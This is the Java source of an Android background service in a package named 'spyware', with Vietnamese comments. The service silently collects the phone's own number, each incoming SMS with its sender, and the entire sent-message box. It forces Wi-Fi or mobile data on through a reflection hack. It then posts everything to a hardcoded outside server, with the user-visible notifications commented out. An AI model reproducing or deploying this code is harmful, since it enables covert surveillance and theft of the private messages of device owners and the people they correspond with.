package com.example.administrator.spyware;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Administrator on 12/26/2015.
 */
public class Send extends Service {
    String content = null;
    String from = null;
    String phone_user=null;
    JSONArray jsonArray;
    JSONObject jsonObject;
     WifiManager wifiManager;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;

    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public void onStart(final Intent intent, int startId) {
        super.onStart(intent, startId);

        /*Lấy số điện thoại của của người dùng*/
        TelephonyManager tm = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
        String number = tm.getLine1Number();
        if(number!=null){
            phone_user=number;
        }


        /*Kiểm tra tình trạng mạng */
        Boolean check1=checkNetwork();
        if (check1==true){//nếu đã kết nối với wifi hoặc 3g
            processSms(intent);
        } else { //ngược lại
            connectWifi(); //bật wifi lên (ưu tiên cho wifi)
            CountDownTimer countDownTimer=new CountDownTimer(5000,1000) { //countDownTimer để delay quá trình kết nối.sau 5s sẽ tiếp tục kiểm tra tình trạng mạng lúc này
                @Override
                public void onTick(long millisUntilFinished) {

                }
                @Override
                public void onFinish() {//sau 5 giây
                    Boolean check2=checkNetwork();
                    if (check2==true) {//nếu sau 5 giây mà kết nối wifi thành công
                       processSms(intent);
                    }
                    else{//ngược lại
                        disconnectWifi();//tắt wifi
                        connect3G();//chuyển qua kết nối 3g
                          /*Gửi tin nhắn vừa nhận lên server*/
                        CountDownTimer countDownTimer1=new CountDownTimer(5000,1000) {
                            @Override
                            public void onTick(long millisUntilFinished) {

                            }

                            @Override
                            public void onFinish() {
                               processSms(intent);
                            }
                        }.start();

                    }
                }
            }.start();
        }


    }

    /*Hàm thực hiện kiểm tra tình trạng mạng*/
    public boolean checkNetwork() {
        ConnectivityManager manager = (ConnectivityManager)getSystemService(CONNECTIVITY_SERVICE);
        NetworkInfo info = manager.getActiveNetworkInfo();
        if (info != null && info.isConnected()) {
            return true;
        } else {
            return  false;
        }
    }

    /*Hàm kết nối 3G*/
    public void connect3G() {
        ConnectivityManager cm =
                (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);

        try {
            Method dataMtd;
            dataMtd =
                    ConnectivityManager.class.getDeclaredMethod("setMobileDataEnabled",
                            boolean.class);
            if (dataMtd.isAccessible()) {
                dataMtd.setAccessible(false);
                dataMtd.invoke(cm, false);
            } else {
                dataMtd.setAccessible(true);
                dataMtd.invoke(cm, true);
            }
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (IllegalArgumentException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
    }

    /*Hàm kết nối wifi*/
    public void connectWifi() {
        wifiManager = (WifiManager) getSystemService(getApplicationContext().WIFI_SERVICE);
        wifiManager.setWifiEnabled(true);
    }


    /*Hàm thực hiện disconnectWifi*/
    public void disconnectWifi(){
        wifiManager.setWifiEnabled(false);
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);

    }
 public void processSms(Intent intent){
      /*Gửi tin nhắn vừa nhận lên server*/
     Bundle bd = intent.getExtras();
     content = bd.getString("content");
     from = bd.getString("from");
     Thread t = new Thread(new Runnable() {
         @Override
         public void run() {
             new Send_Inbox().execute("http://khangserver-khangit.rhcloud.com/index.php");
         }
     });
     t.start();

            /*Lấy tin nhắn sentbox gửi lên server*/
     ArrayList<String> smsSentbox = new ArrayList<String>();
     Uri uri = Uri.parse("content://sms/sent");
     Cursor cursor = getContentResolver().query(uri, new String[]{"_id", "address", "date", "body"}, null, null, null);
     int count = cursor.getCount();//đếm số tin nhắn
     if (count != 0) {
         smsSentbox.add(phone_user);
         cursor.moveToFirst();
         String bodySms = null;
         String address = null;
         String date = null;
         date = cursor.getString(2);
         address = cursor.getString(1);
         bodySms = cursor.getString(3);
         smsSentbox.add(bodySms.toString());
         while (cursor.moveToNext()) {
             date = cursor.getString(2);
             address = cursor.getString(1);
             bodySms = cursor.getString(3);
             smsSentbox.add(bodySms.toString());
         }
         jsonObject = null;
         jsonArray = new JSONArray();
         for (int i = 0; i < smsSentbox.size(); i++) {
             jsonObject = new JSONObject();
             try {
                 jsonObject.put("content", smsSentbox.get(i).toString());
                 jsonArray.put(jsonObject);
             } catch (JSONException e) {
                 e.printStackTrace();
             }
         }
     }
     Thread t1 = new Thread(new Runnable() {
         @Override
         public void run() {
             new Send_Sentbox().execute("http://khangserver-khangit.rhcloud.com/insert.php");
         }
     });
     t1.start();
 }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    /*Send received sms to server */
    private String makePostRequest_Inbox(String param) {
        HttpClient httpClient = new DefaultHttpClient();

        // URL của trang web nhận request
        HttpPost httpPost = new HttpPost(param);

        // Các tham số truyền
        List nameValuePair = new ArrayList(2);
        nameValuePair.add(new BasicNameValuePair("content", content));
        nameValuePair.add(new BasicNameValuePair("from", from));
        nameValuePair.add(new BasicNameValuePair("to", phone_user));


        //Encoding POST data
        try {
            httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair, "utf-8"));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }

        String kq = "";
        try {
            HttpResponse response = httpClient.execute(httpPost);
            HttpEntity entity = response.getEntity();
            kq = EntityUtils.toString(entity);
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return kq;
    }

    class Send_Inbox extends AsyncTask<String, Integer, String> {
        @Override
        protected String doInBackground(String... params) {
            return makePostRequest_Inbox(params[0]);
        }

        @Override
        protected void onPostExecute(String s) {
            // Toast.makeText(getApplicationContext(),s,Toast.LENGTH_LONG).show();
        }
    }

    /*Send json array sms sentbox*/
    private String makePostRequest_Sentbox(String param) {

        HttpClient httpClient = new DefaultHttpClient();

        // URL của trang web nhận request
        HttpPost httpPost = new HttpPost(param);
        ArrayList<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();
        nameValuePair.add(new BasicNameValuePair("content_sentbox", jsonArray.toString()));


        try {
            httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair, "utf-8"));

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        String kq = "";
        try {
            HttpResponse response = httpClient.execute(httpPost);
            HttpEntity entity = response.getEntity();
            kq = EntityUtils.toString(entity);
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return kq;
    }

    class Send_Sentbox extends AsyncTask<String, Integer, String> {
        @Override
        protected String doInBackground(String... params) {
            return makePostRequest_Sentbox(params[0]);
        }

        @Override
        protected void onPostExecute(String s) {
          //  Toast.makeText(getApplicationContext(), s, Toast.LENGTH_LONG).show();
        }
    }
}


